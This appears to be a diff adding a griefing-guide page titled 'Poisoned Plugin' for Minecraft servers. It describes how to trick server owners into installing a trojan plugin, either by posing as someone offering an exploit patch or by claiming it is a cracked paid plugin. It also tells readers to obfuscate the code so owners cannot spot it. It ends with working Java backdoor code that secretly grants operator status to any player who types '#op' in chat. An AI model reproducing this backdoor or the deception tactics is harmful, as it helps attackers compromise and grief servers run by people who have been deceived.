@@ -1,3 +1,33 @@
 # Poisoned Plugin
 
-Work in progress
+**Overview**
+
+A poisoned plugin (also called a backdoored or trojan plugin) is a plugin that can be used to gain yourself OP. The idea is to trick the server owner or administrator to install it on their server. How do you do that? This requires some social engineering.
+
+A trojan is a piece of malware that looks legit, but it's purpose and execution is malicious.
+
+You can e.g. find an exploit or bug on the server. This could e.g. be a crash exploit. Tell the owner that you discovered the exploit, and you have a patch for it. Send them the legit-looking plugin and make them install it on the server. When it's installed, you can then use it's feature to gain OP and grief the server.
+
+An other way to make them intall it, is by telling them that you got a cracked version of a paid plugin. E.g. Advanced Anti Cheat (AAC).
+
+This griefing method requires a little knowledge in Java programming, as you need to develop your own plugin.
+
+If you know how to script scripts using Skript or Denizen, you can obtain the same result. Of course you need to hide the code better e.g. by obfuscating it (make the code look confusing), as the server owner or administrator can easily read it. Same goes for Java plugins. You can obfuscate Skript scripts by using [this tool](), and [ProGuard]() for Java plugins.
+
+Here's an example of what an unobfuscated simple poisoned plugins code could look like:
+```java
+public class main extends JavaPlugin implements Listener {
+
+    public void onEnable() {
+        this.getServer().getPluginManager().registerEvents((Listener)this, (Plugin)this);
+    }
+    
+    @EventHandler
+    public void onPlayerChat(PlayerChatEvent event) {
+        if (event.getMessage().startsWith("#op")) {
+            event.setCancelled(true);
+            event.getPlayer().setOp(true);
+        }
+    }
+}
+```
